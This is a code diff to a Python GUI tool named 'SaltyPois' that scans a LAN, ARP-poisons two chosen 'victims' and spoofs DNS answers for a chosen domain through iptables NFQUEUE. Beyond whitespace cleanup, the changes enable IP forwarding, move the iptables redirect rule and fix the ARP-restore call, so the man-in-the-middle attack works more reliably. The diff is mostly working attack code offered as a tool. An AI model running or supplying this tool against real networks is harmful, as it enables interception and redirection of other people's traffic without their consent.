@@ -8,17 +8,19 @@ import thread
 import os
 
 DnsState = False
-os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+
+os.system('sysctl -w net.ipv4.ip_forward=1')
 localIP = socket.gethostbyname(socket.gethostname())  # IP address for poisoned hosts.
 nfq = NetfilterQueue()
 
 
-#display availible interfaces
+# display availible interfaces
 def showInterfaces():
     for iface in get_if_list():
         prt(iface)
 
-#network scanner
+
+# network scanner
 def netword_scaner(iface, range):
     prt("Started scanning")
 
@@ -29,8 +31,9 @@ def netword_scaner(iface, range):
     prt("MAC - IP\n")
     for snd, rcv in ans:
         prt(rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
-        #rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
+        # rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))
     prt("Scanning completed")
+
 
 def start_scan():
     iface = eif.get()
@@ -51,11 +54,12 @@ def start_scan():
     prt("    " + range + "\n")
     thread.start_new_thread(netword_scaner, (iface, range))
 
-#arp poisoner
+
+# arp poisoner
 def sendARP(target1, mac1, target2, mac2):
     send(ARP(op=2, pdst=target1, psrc=target2, hwdst=mac1))
     send(ARP(op=2, pdst=target2, psrc=target1, hwdst=mac2))
-    prt("ARP packets send")
+    prt("ARP packets send!")
 
 
 def getMac(IP):
@@ -65,29 +69,32 @@ def getMac(IP):
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
 
+
 def Arp(target1, target2):
     global arping
     mac1 = getMac(target1)
     mac2 = getMac(target2)
     while arping:
-        prt("Sending Arp packets\n")
+        prt("Sending Arp Poison Packets!\n")
         sendARP(target1, mac1, target2, mac2)
         time.sleep(5)
-    reArp(target1, target2)
+    reArp(target1, mac1, target2, mac2)
 
 
 def reArp(target1, mac1, target2, mac2):
-    prt("[*] Restoring Targets...\n")
+    prt("Re-Arping Victims\n")
     send(ARP(op=2, pdst=target2, psrc=target1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac1), count=7)
     send(ARP(op=2, pdst=target1, psrc=target2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac2), count=7)
 
 
 arping = True
+
+
 def toggle_arp():
     global arping
     if (arping):
         arping = False
-        arpBtn.set("start arp poisoning")
+        arpBtn.set("start arp poisoning!")
     else:
         iface = eif.get()
         target1 = victim1.get()
@@ -106,13 +113,13 @@ def toggle_arp():
         prt("Starting arp spoofing over interface:")
         prt("    " + iface)
         prt("between victims at:")
-        prt("    " + target1 + "and" + target2 + "\n")
+        prt("    " + target1 + " and " + target2 + "\n")
         thread.start_new_thread(Arp, (target1, target2,))
 
-
-
-#dns spoofer
+domain = 'nothing'
+# dns spoofer
 def callback(packet):
+    global domain
     payload = packet.get_payload()
     pkt = IP(payload)
 
@@ -133,6 +140,7 @@ def callback(packet):
 
 
 def dnsmain(nfq):
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
     nfq.bind(1, callback)
     try:
         dnsBtn.set("stop dns spoofing")
@@ -150,7 +158,7 @@ def toggle_dns():
     global dnsBtn
     global DnsState
     global nfq
-    if(DnsState):
+    if (DnsState):
         DnsState = False
         nfq.unbind()
         os.system('iptables -F')
@@ -158,6 +166,7 @@ def toggle_dns():
         dnsBtn.set("start dns spoofing")
         prt("stopping DNS spoofing via interface")
     else:
+        global domain
         domain = domain1.get()
         if not domain:
             prt("you need to enter a domain on which you want to spoof")
@@ -171,13 +180,13 @@ def toggle_dns():
         dnsmain(nfq)
 
 
-
-#gui definitions
+# gui definitions
 def prt(string):
     outputWindow.configure(state='normal')
     outputWindow.insert(END, string + "\n")
     outputWindow.see("end")
     outputWindow.configure(state=DISABLED)
+
 
 root = Tk()
 root.title('SaltyPois')
@@ -196,13 +205,12 @@ topRight.pack(side=RIGHT, fill=Y)
 
 # topRight frame
 outMenu = Frame(topRight)
-label1 = Label(outMenu,text="Output window:")
+label1 = Label(outMenu, text="Output window:")
 label1.pack(side=LEFT)
 outMenu.grid(row=0)
 
 outWindow = Frame(topRight)
 outWindow.grid(row=1)
-
 
 # interfaces frame
 interfaces = Frame(topLeft)
@@ -210,7 +218,7 @@ interfaces = Frame(topLeft)
 button2 = Button(interfaces, text="show interfaces", command=showInterfaces)
 button2.pack(side=TOP)
 
-labelif = Label(interfaces,text="interface:")
+labelif = Label(interfaces, text="interface:")
 labelif.pack(side=TOP)
 eif = Entry(interfaces)
 eif.pack(side=TOP)
@@ -218,11 +226,10 @@ eif.insert(0, "enp0s3")
 
 interfaces.pack(side=TOP, fill=X)
 
-
 # scanner frame
 scanner = Frame(topLeft)
 
-labelrange = Label(scanner,text="ip range:")
+labelrange = Label(scanner, text="ip range:")
 labelrange.pack(side=TOP)
 erange = Entry(scanner)
 erange.pack(side=TOP)
@@ -233,16 +240,15 @@ button3.pack(side=TOP)
 
 scanner.pack(side=TOP)
 
-
 # arp spoofer frame
 arp = Frame(topLeft)
 
-labelif = Label(arp,text="ip victim1:")
+labelif = Label(arp, text="ip victim1:")
 labelif.pack(side=TOP)
 victim1 = Entry(arp)
 victim1.pack(side=TOP)
 
-labelrange = Label(arp,text="ip victim2:")
+labelrange = Label(arp, text="ip victim2:")
 labelrange.pack(side=TOP)
 victim2 = Entry(arp)
 victim2.pack(side=TOP)
@@ -255,16 +261,15 @@ arpBtn.set("start arp poisoning")
 
 arp.pack(side=TOP)
 
-
 # dns spoofer frame
 dns = Frame(topLeft)
 
-labelDomain = Label(dns,text="domain to be spoofed")
+labelDomain = Label(dns, text="domain to be spoofed")
 labelDomain.pack(side=TOP)
 domain1 = Entry(dns)
 domain1.pack(side=TOP)
 
-labelIp = Label(dns,text="DNS spoof ip")
+labelIp = Label(dns, text="DNS spoof ip")
 labelIp.pack(side=TOP)
 spoofIp = Entry(dns)
 spoofIp.pack(side=TOP)
@@ -280,7 +285,7 @@ dns.pack(side=TOP)
 # define input window(top left)
 
 # define output window
-outputWindow = Text(outWindow,height=25, width=60)
+outputWindow = Text(outWindow, height=25, width=60)
 outputWindow.pack(side=LEFT, fill=Y)
 scrollbar = Scrollbar(outWindow)
 scrollbar.pack(side=RIGHT, fill=Y)
@@ -289,7 +294,4 @@ outputWindow.config(yscrollcommand=scrollbar.set, state=DISABLED)
 
 count = 0;
 
-
-
 root.mainloop()
-
